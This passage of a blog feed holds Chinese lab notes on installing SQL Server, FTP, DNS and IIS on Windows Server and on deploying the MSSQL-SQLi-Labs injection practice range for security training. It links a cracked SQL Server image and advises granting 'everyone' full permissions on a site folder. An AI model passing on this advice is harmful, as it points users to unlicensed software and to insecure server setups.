class="string">&quot;#&quot;</span>&gt;</span>XML<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>Web Building<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>Reference<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果</p><p><img data-src="https://gitee.com/vectorx/ImageCloud/raw/master/html5/20210524215648.gif" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;09-浮动&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#09-浮动&quot;&gt;#&lt;/a&gt; 09 - 浮动&lt;/h1&gt;
&lt;p&gt;笔记来源：&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cHM6Ly93d3cuYmlsaWJp</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://sun-spots.github.io/2022/01/19/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E5%B8%B8%E7%94%A8%E7%9F%A5%E8%AF%86/MSSQL%E5%AE%89%E8%A3%85/"/>
    <id>https://sun-spots.github.io/2022/01/19/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E5%B8%B8%E7%94%A8%E7%9F%A5%E8%AF%86/MSSQL%E5%AE%89%E8%A3%85/</id>
    <published>2022-01-19T10:31:55.838Z</published>
    <updated>2022-01-19T10:33:12.798Z</updated>
    
    <content type="html"><![CDATA[<h1 id="mssql安装"><a class="markdownIt-Anchor" href="#mssql安装">#</a> MSSQL 安装</h1><table><thead><tr><th>操作系统</th><th>数据库系统</th><th>系统配置</th></tr></thead><tbody><tr><td>Windows server 2012R2</td><td>SQL Server 2012R2</td><td>内存 4G / 硬盘 40G</td></tr></tbody></table><p>数据库镜像下载地址：</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ed2k://|file|cn_sql_server_2012_enterprise_edition_with_sp1_x64_dvd_1234495.iso|<span class="number">4231520256</span>|EB9F35CAC10578613A6E9D56090BAF06|/    </span><br></pre></td></tr></table></figure><p>步骤一：将 sql server 镜像文件添加到虚拟机中，并在虚拟机中打开</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1624969886291-fc52fd78-cf11-4f53-9128-e365d85733b0.png" alt="img"></p><p>步骤二：点击安装–&gt; 权限 SQL Server 独立安装或向现有安装添加功能</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1624969951852-28ac96a9-57b4-409a-bee6-ac44cf07bb2a.png" alt="img"></p><p>步骤三：输入产品密钥，破解版本即我告诉你下载自带激活密钥</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1624970007589-a22581ca-09d9-4f38-9374-2bfeb33dd434.png" alt="img"></p><p>步骤四：一路回车检测完毕后，到达一下页面选择 SQL Server 功能安装–&gt; 在功能处点击全选</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1624970168419-03103d82-ccf3-41b5-af18-0f1da16998e8.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1624970231406-fcce7d7e-7cbf-44cf-b45c-fa1c0711aab0.png" alt="img"></p><p>步骤五：在检测完毕后来到实例配置页面选择默认实例即可，进入检测</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1624970298848-12963874-812a-468d-8e83-c890d5259163.png" alt="img"></p><p>步骤六：检测完毕后，配置身份认证模式选择混合模式并为 SA 账户配置密码</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1624970518373-241b4878-6183-48ef-b497-d0b4e55ed0bc.png" alt="img"></p><p>步骤七：一路回车，如果遇到问题直接添加当前用户，来到此页面点击安装就完事！</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1624970598907-5e9ace51-b82d-47cf-8dcf-e3362214730d.png" alt="img"></p><p>步骤八：进行验证操作，使用 SA 身份进行登录</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1624972006387-a4b9169d-0c0b-40ba-ad61-79a419c106f4.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1624971934585-1befded6-e139-4a32-b12d-0a765a0ed377.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;mssql安装&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#mssql安装&quot;&gt;#&lt;/a&gt; MSSQL 安装&lt;/h1&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;操作系统&lt;/th&gt;
&lt;th&gt;数据库系统&lt;/th&gt;
&lt;th&gt;系统配置</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://sun-spots.github.io/2022/01/19/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%BA%8C%E5%91%A8/2.2FTP-DNS%E6%9C%8D%E5%8A%A1/"/>
    <id>https://sun-spots.github.io/2022/01/19/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%BA%8C%E5%91%A8/2.2FTP-DNS%E6%9C%8D%E5%8A%A1/</id>
    <published>2022-01-19T10:29:52.065Z</published>
    <updated>2022-01-19T10:31:29.428Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第二天ftpdns服务"><a class="markdownIt-Anchor" href="#第二天ftpdns服务">#</a> 第二天：FTP/DNS 服务</h1><h1 id="一ftp服务"><a class="markdownIt-Anchor" href="#一ftp服务">#</a> 一：FTP 服务</h1><p>FTP 是 File Transfer Protocol（文件传输协议）的缩写，用来在两台计算机之间互相传送文件。相比于 HTTP，FTP 协议要复杂得多。复杂的原因，是因为 FTP 协议要用到两个 TCP 连接，一个是命令链路，用来在 FTP 客户端与服务器之间传递命令；另一个是数据链路，用来上传或下载数据。</p><p>20 号端口用来传输数据，21 号端口用来传输指令。</p><p>》》》http 协议，ftp 协议，邮件协议（smtp，pop）最早的三个应用级协议《《《</p><p>基于 C/S 结构：FTP 服务与客户端连接采用双通道连接协议，一个通道负责传输指令连接以及协商数据传输的随机端口，一个通道负责传输数据连接</p><p>FTP 协议有两种工作方式：PORT 方式和 PASV 方式，中文意思为主动式和被动式。<br>PORT（主动）方式的连接过程是：客户端向服务器的 FTP 端口（默认是 21）发送连接请求，服务器接受连接，建立一条命令链路。当需要传送数据时，客户端在命令链路上用 PORT 命令告诉服务器：“我打开了 XXXX 端口，你过来连接我”。于是服务器从 20 端口向客户端的 XXXX 端口发送连接请求，建立一条数据链路来传送数据。<br>PASV（被动）方式的连接过程是：客户端向服务器的 FTP 端口（默认是 21）发送连接请求，服务器接受连接，建立一条命令链路。当需要传送数据时，服务器在命令链路上用 PASV 命令告诉客户端：“我打开了 XXXX 端口，你过来连接我”。于是客户端向服务器的 XXXX 端口发送连接请求，建立一条数据链路来传送数据。</p><h3 id="11ftp软件介绍"><a class="markdownIt-Anchor" href="#11ftp软件介绍">#</a> 1.1：FTP 软件介绍</h3><p>FTP 服务器：<br>Wu-ftpd，Proftpd，Pureftpd，ServU，IIS<br>vsftpd:Very Secure FTP Daemon，CentOS 默认 FTP 服务器 高速，稳定，下载速度是 WU-FTP 的两倍 ftp,redhat.com 数据：单机最多可支持 15000 个并发</p><p>客户端软件： ftp，lftp，lftpget，wget，curl<br>ftp -A ftpserver port -A 主动模式 –p 被动模式<br> lftp –u username ftpserver<br>lftp username@ftpserver<br>lftpget <span class="exturl" data-url="ZnRwOi8vZnRwc2VydmVyL3B1Yi9maWxl">ftp://ftpserver/pub/file</span><br>gftp: GUI centos5 最新版 2.0.19 (11/30/2008)<br> filezilla（开源免费的 linuxftp 客户端软件，支持 ssh 协议），CuteFtp，FlashFXP，LeapFtp<br>IE <span class="exturl" data-url="ZnRwOi8vdXNlcm5hbWU6cGFzc3dvcmRAZnRwc2VydmVy">ftp://username:password@ftpserver</span></p><h3 id="12ftp服务介绍"><a class="markdownIt-Anchor" href="#12ftp服务介绍">#</a> 1.2：FTP 服务介绍</h3><p>1XX：信息 125：数据连接打开<br> 2XX：成功类状态 200：命令 OK 230：登录成功<br> 3XX：补充类 331：用户名 OK<br>4XX：客户端错误 425：不能打开数据连接<br> 5XX：服务器错误 530：不能登录</p><h3 id="13基本ftp服务搭建"><a class="markdownIt-Anchor" href="#13基本ftp服务搭建">#</a> 1.3：基本 FTP 服务搭建</h3><p>步骤一：在 Windows server 2012R2 中打开服务器管理器–&gt; 点击 ** 添加角色与功能–&gt;** 一路回车到达选择服务器角色界面勾上 FTP 服务–&gt; 一路回车到达安装界面点击安装即可。</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625473229730-08b73c62-c33d-4942-8d42-69ebb93dccb8.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625473264525-ffa9789a-972d-42d8-9213-cbb553cd6b75.png" alt="img"></p><p>步骤二：创建相关的用户 (ftpadmin) 和组 (ftpuser) 并将创建的用户添加到 ftpuser 组中，方便进行统一的权限管理。</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625473423755-270ff1ef-ff63-481d-badf-3f71f50f213c.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625473472481-efa87e97-cf44-4573-abb6-2c3fd0d04068.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625473520827-0ce5e79e-5a9f-43e1-9544-d0684319b07b.png" alt="img"></p><p>步骤三：创建 FTP 站点并进行相关配置</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625473675531-fce4a2b5-d4eb-4e9f-bd3e-fddae37a8f2d.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625473704430-3b551762-3276-4107-9065-fda2fb0f2324.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625473755097-4ccfec89-cf17-439b-b651-107d39a25123.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625473810392-1d54e976-8d0f-4579-9952-1ff244eb5f9d.png" alt="img"><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625473832468-93d47636-1799-4b1b-a2dd-f38c3014bb43.png" alt="img"></p><p>第四部：在客户端 IE 浏览器中访问 <code>ftp://192.168.0.240/</code>  并进行登录验证，再使用 Winscp 等 FTP 客户端工具对其目录中写入文件，并回到服务器进行验证！！！</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625531518742-21012f4b-7db3-4a34-8881-baa3861c2f21.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625531524834-fd362a41-e75c-4ab5-adf6-120182f83e8f.png" alt="img"><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625531533293-3898b987-a175-4857-a5cb-9e8d620dab0b.png" alt="img"></p><p>1.x：待扩展</p><h1 id="二dns服务"><a class="markdownIt-Anchor" href="#二dns服务">#</a> 二：DNS 服务</h1><p>DNS (Domain Name System) 是 “域名系统” 的英文缩写，是一种组织成域层次结构的计算机和网络服务命名系统，使用的是 UDP 协议的 53 号端口，它用于 TCP/IP 网络，它所提供的服务是用来将主机名和域名转换为 IP 地址的工作。DNS 就是这样的一位 “翻译官”，它的基本工作原理可用下图来表示。</p><p>DNS 服务一般分为正向解析与反向解析</p><p>正向解析：域名–&gt;IP 地址</p><p>反向解析：IP 地址–&gt; 域名</p><h3 id="21搭建dns服务"><a class="markdownIt-Anchor" href="#21搭建dns服务">#</a> 2.1：搭建 DNS 服务</h3><p>步骤一：配置好静态 IP 地址，并将 DNS 服务器地址改为本地的回环地址；打开服务器管理器–&gt; 添加角色和功能–&gt; 一路回车到达选择服务器角色页面勾选 DNS 服务器并继续…</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625532431445-857dd129-6e95-4d77-a017-73dba5c9e8d5.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625533844314-d4bcd58c-d2cb-4273-9965-3c5766b29716.png" alt="img"></p><p>步骤二：继续并且到安装界面进行安装–&gt; 安装完成后点击服务器管理器–&gt; 工具–&gt;DNS 之后打开 DNS 控制台界面…</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625532572754-c6698643-d1f8-4d96-9dc5-111a52ed90b9.png" alt="img"><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625533181518-3f352e3e-bc79-49c5-9a33-638022c53f19.png" alt="img"></p><h3 id="22正向解析"><a class="markdownIt-Anchor" href="#22正向解析">#</a> 2.2：正向解析</h3><table><thead><tr><th></th><th>服务器</th><th>客户机</th></tr></thead><tbody><tr><td>IP 地址</td><td>192.168.0.40</td><td>192.168.0.</td></tr><tr><td>安装服务</td><td>DNS/WEB</td><td>无</td></tr><tr><td>DNS 指向地址</td><td>127.0.0.1</td><td>192.168.0.40</td></tr></tbody></table><p>步骤一：在客户端中使用浏览器通过 IP 地址访问服务器已搭建好的 WEB 服务，并将 DNS 服务器地址指向服务器！</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625533808650-fd72b15c-dae0-47ee-be04-e69bea574518.png" alt="img"></p><p>步骤二：在服务器管理中–工具–&gt;DNS 服务–&gt; 正向查找区域右键–&gt; 新建区域–&gt; 区域类型选择主要区域–&gt; 区域名称自定–一路回车默认安装</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625533986914-1d55e4cf-2f38-46ac-9526-7ad7e541b7c4.png" alt="img"><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625534006466-40e4bb33-a627-4f21-9e12-4eb7aa7af2e2.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625534110005-3651f0ac-8456-4227-bc38-df3980f90426.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625534142913-82bf2076-6b0f-4c37-9061-4165f0bff149.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625534152023-ee6c4ae6-d21d-4dbd-9dd8-ff8d87f73196.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625534161793-138d5593-e031-469b-966c-dd67446325e5.png" alt="img"></p><p>步骤三：点进刚才创建的区域 warsec.com 并新建主机记录即可创建正向解析</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625534227241-dbdd649e-9732-4114-b10c-80fe835984ad.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625534297716-967d4fcc-b8b1-458c-8076-c1db99f6085c.png" alt="img"></p><p>步骤四：创建好主机记录后再客户机再浏览器中使用域名进行访问访问成功即可…</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625534401666-11840034-a416-4323-9f48-95130009acf1.png" alt="img"></p><h3 id="23反向解析"><a class="markdownIt-Anchor" href="#23反向解析">#</a> 2.3：反向解析</h3><p>&gt;&gt;&gt; 使用环境延续正向解析环境 &lt;&lt;&lt;</p><p>步骤一：DNS 管理器控制面板中右键反向查找区域并新建区域–&gt; 主要区域–&gt;IPV4 反向查找区域–&gt; 网络 ID–&gt;… 完成</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625534552583-279002c4-347f-4f58-b744-0bdcda7276df.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625534564915-85089af6-5f28-476e-9b58-e3b3daaf2c77.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625534576354-ded72d80-e157-4b7a-a74c-067b76ce09bd.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625534585593-9d264c2e-fcb2-4eec-b9db-968bc10cf0bf.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625534594451-f29affbb-c308-485c-a2ed-53ef053b0860.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625534603489-2e9734f0-b8e4-45e7-ba2b-685cc883cbcc.png" alt="img"></p><p>步骤二：反向查找区出创建好后点击进去并右键新建指针–&gt; 填写好 IP 地址并选定好主机名–&gt; 完成…</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625534725734-7531496d-6e7f-45cf-b099-2210243c3873.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625534783663-e40eaabc-8484-4774-a797-2f7d24eb7ba2.png" alt="img"></p><p>步骤三：在客户端 CMD 里使用 nslookup 命令进行反向解析测试…</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625534930448-1e947106-f7b9-41ee-8000-fe13da96897d.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;第二天ftpdns服务&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#第二天ftpdns服务&quot;&gt;#&lt;/a&gt; 第二天：FTP/DNS 服务&lt;/h1&gt;
&lt;h1 id=&quot;一ftp服务&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://sun-spots.github.io/2022/01/19/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%BA%8C%E5%91%A8/2.1WEB-CA%E8%AF%81%E4%B9%A6/"/>
    <id>https://sun-spots.github.io/2022/01/19/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%BA%8C%E5%91%A8/2.1WEB-CA%E8%AF%81%E4%B9%A6/</id>
    <published>2022-01-19T10:27:16.093Z</published>
    <updated>2022-01-19T10:29:24.796Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第一天webca证书"><a class="markdownIt-Anchor" href="#第一天webca证书">#</a> 第一天：WEB/CA 证书</h1><h1 id="一http服务"><a class="markdownIt-Anchor" href="#一http服务">#</a> 一：HTTP 服务</h1><p>IIS 说的是互联网信息服务，全名：Internet Information Services。是微软提供的基于运行 Windows 的互联网基本服务。基本的 windows 版本都支持 IIS 配置，XP,win8 等家庭版的 IIS 一般只够支持开发等小团队使用。windows 服务版支持发布站点使用。</p><h3 id="实验一搭建http服务"><a class="markdownIt-Anchor" href="#实验一搭建http服务">#</a> 实验一：搭建 HTTP 服务</h3><table><thead><tr><th>服务器 IP 地址</th><th>服务器操作系统</th></tr></thead><tbody><tr><td>192.168.1.225</td><td>Windows server 2012R2</td></tr></tbody></table><p>步骤一：打开服务器管理器 (cmd：servermanager)–&gt; 选择<strong>添加角色和功能</strong></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1624932711467-5d4c5cb5-332b-4ffc-bea1-1f26169ac773.png" alt="img"></p><p>步骤二：一路回车到<strong>服务器角色</strong>，选择 WEB 服务 (IIS)</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1624932895168-eb19f35b-b994-4df4-aae2-0bac93d5f6ed.png" alt="img"></p><p>步骤三：在角色服务中根绝不同的需求进行添加，一般选择默认即可</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1624933120813-1776a570-d64f-4a42-adcf-1f7d2b4fdfae.png" alt="img"></p><p>步骤四：一路回车等待安装成功并在服务器管理器–&gt; 工具–&gt;Internet Information Servers (iis) 管理器打开 IIS 的控制台并在客户机器浏览器中访问</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1624933354992-9bcd2fb0-9bf9-4b6b-9114-87f9387dbe41.png" alt="img"></p><h3 id="实验二创建http站点"><a class="markdownIt-Anchor" href="#实验二创建http站点">#</a> 实验二：创建 HTTP 站点</h3><p>步骤一：打开 IIS 控制台 (Inetmgr)–&gt; 网站列表右键–&gt; 新建网站</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1624933923177-27fd9217-e55b-4691-b238-8eabe5f8f776.png" alt="img"></p><p>步骤二：在网站根目录下创建网站的首页文件 index.html 并在客户端进行访问</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1624934073547-b0e8a3ac-6ac9-4272-848b-cea706f53b3f.png" alt="img"></p><h3 id="实验三创建虚拟目录"><a class="markdownIt-Anchor" href="#实验三创建虚拟目录">#</a> 实验三：创建虚拟目录</h3><p>步骤一：在刚才已经创建好的网站右键–&gt; 添加虚拟目录–&gt; 别名为访问该虚拟目录路径–&gt; 指定虚拟目录的物理路径创建好之后在该网站下会出现文件夹的链接</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1624934438118-00862ff8-b6bd-42ba-906e-2510b78b7218.png" alt="img"></p><p>步骤二：客户端访问并验证</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1624934530522-10d10b36-27b6-4aa7-8e00-40901a3c1053.png" alt="img"></p><h3 id="实验四iis搭建多个站点"><a class="markdownIt-Anchor" href="#实验四iis搭建多个站点">#</a> 实验四：IIS 搭建多个站点</h3><ul><li><p><strong>相同<strong><strong> IP</strong></strong> 不同端口配置</strong></p></li><li><p><strong>不同的<strong><strong> IP</strong></strong> 相同的端口配置</strong></p></li><li><p><strong>相同的<strong><strong> IP</strong></strong> 相同的端口显示不同的网站（可不做）</strong></p></li></ul><ol><li>相同 IP 不同端口配置验证</li></ol><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1624966366968-b79aab09-c90b-4a11-b49b-b71eb77283eb.png" alt="img"></p><ol><li>不同的 IP 相同的端口配置验证</li></ol><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1624966637176-f0b7a8e2-e517-4dce-85df-d2baf8492d15.png" alt="img"></p><ol><li>相同的 IP 相同的端口显示不同的网站验证 (可不做)</li></ol><p>详细步骤：在 DNS 服务其中创建两个区域分别创建两条主机记录，在从站点基本设置中绑定不同的域名设置好客户端的 DNS 服务器测试.</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1624967295401-8093aad5-72b9-4268-a91e-38986430c11d.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1624967377848-9190d5ad-7457-440f-b230-5f4f3d9f34b4.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1624967224052-6159b27f-ee46-42f2-acdd-676e885d44aa.png" alt="img"></p><h3 id="实验五ip地址黑白名单"><a class="markdownIt-Anchor" href="#实验五ip地址黑白名单">#</a> 实验五：IP 地址黑白名单</h3><p>步骤一：在网站主页选择<strong> IP 地址和域限制</strong>并打开功能–&gt; 添加允许条目为白名单 / 添加拒绝条目为黑名单</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1624934873837-92624c5f-16d9-4f4f-a451-83370839594c.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1624935551843-8b851406-e39e-4676-b4a8-d6e5750e5be1.png" alt="img"></p><p>步骤二：添加好拒绝条目之后重启站点并在客户端浏览器访问验证</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1624935664426-90336449-6971-4e1f-82ef-9ed0e362dcdb.png" alt="img"></p><h3 id="实验六搭建aspaccess站点"><a class="markdownIt-Anchor" href="#实验六搭建aspaccess站点">#</a> 实验六：搭建 ASP+Access 站点</h3><table><thead><tr><th>服务器 IP 地址</th><th>服务器系统</th><th>CMS 源码</th></tr></thead><tbody><tr><td>192.168.1.</td><td>Windows server 2012 R2</td><td>天人文章管理系统 5.8</td></tr></tbody></table><p>CMS 源码下载地址：<span class="exturl" data-url="aHR0cHM6Ly93d3cubXljb2Rlcy5uZXQvMjEvODcxOS5odG0=">https://www.mycodes.net/21/8719.htm</span></p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">链接：https://pan.baidu.com/s/<span class="number">1</span>G6lu9043AcGF2NcjDNDEbQ </span><br><span class="line">提取码：<span class="number">54</span>fl</span><br></pre></td></tr></table></figure><p>步骤一：将源码文件复制到 C 盘网站存放目录下</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1624956726197-eb1f2b37-6856-48bc-9f05-a31e78658bb9.png" alt="img"></p><p>步骤二：在 IIS 控制台网站列表右键–&gt; 新建站点–&gt; 填写好各个选项</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1624964572198-ab7e1aa3-8d04-41b8-9fa6-41c381806802.png" alt="img"></p><p>步骤三：来到天人网站的主页点进 ASP–&gt;** 启用父路径–&gt;** 若找不到请重新安装 IIS 的 ASP 组件</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1624964747736-e8d22653-9104-4e7d-8aa8-57122b7af02f.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1624964768985-19c3d8ad-ba43-4d72-a47b-868cd09fad0e.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1624956545922-c8da3437-8c62-4c81-b0f3-5e088a4628d2.png" alt="img"></p><p>步骤四：再次来到天人网站的主页–&gt; 点进默认文档–添加该 CMS 的首页文件 <code>index.asp</code></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1624964965068-a8ed49d5-ae14-460c-92b0-e2e5384e2f79.png" alt="img"></p><p>步骤五：再次来到天人网站的主页–&gt; 点进目录浏览–选择启用</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1624965194503-cab35d63-8ba3-414b-a1c4-4536f667ed4d.png" alt="img"></p><p>步骤六：点击 IIS 控制器的应用程序池–&gt; 点击 DefaultAppPool–&gt; 点击右边的高级设置–&gt; 将<strong>启用 32 位应用程序</strong>改为 True</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1624965396682-682dee72-6a52-49e0-bd20-0d7597e45807.png" alt="img"></p><p>步骤七：右键天人网站–&gt; 编辑权限–&gt; 选择安全选项卡–&gt; 编辑–&gt; 添加–&gt; 输入 everyone–&gt; 确定–&gt; 给上所有权限–&gt; 重启站点</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1624965516792-2e1a1b3b-1671-4c0e-9c14-01993946bbb1.png" alt="img"></p><p>第八步：访问网站并验证是否搭建成功</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1624965565965-c4028b18-525c-4895-9910-f179bfc89aad.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1624965597341-bf2b76b4-3a87-4534-a9be-81b81c738843.png" alt="img"></p><h3 id="实验七搭建aspmssql站点"><a class="markdownIt-Anchor" href="#实验七搭建aspmssql站点">#</a> 实验七：搭建 ASP+Mssql 站点</h3><table><thead><tr><th>操作系统</th><th>数据库操作系统</th><th>源码程序</th></tr></thead><tbody><tr><td>Windows server 2012R2</td><td>SQL Server 2012</td><td>MSSQL-SQLi-Labs-master</td></tr></tbody></table><p>MSSQLi-labs 下载：</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">链接：https://pan.baidu.com/s/<span class="number">1</span>bMEyvEScAZrEAqn26wB2gA </span><br><span class="line">提取码：<span class="number">54</span>fl</span><br></pre></td></tr></table></figure><p>步骤一：搭建好 SQLServer 数据库，并做验证可参照下级目录的 <code>扩展：MSSQL数据库的安装</code></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1624972006387-a4b9169d-0c0b-40ba-ad61-79a419c106f4.png" alt="img"></p><p>步骤二：进入数据库创建 test 数据库，作为网站程序要连接的数据库</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625015748098-d19aec5a-ff3f-420c-b188-483c016b457e.png" alt="img"></p><p>步骤三：下载 MSSQLi-Labs 复制到服务器的网站根目录下进行同上的 ASP 站点的配置；修改 <code>config.asp</code>  文件中的配置信息</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625015900888-80f0ee98-c3f6-402f-85c5-c1cf319dcba2.png" alt="img"></p><p>步骤四：访问网站并进行安装该靶场…</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625015951169-b146ab56-22f5-46bc-a614-3de7fd418c0c.png" alt="img"></p><h3 id="img"><a class="markdownIt-Anchor" href="#img">#</a> <img 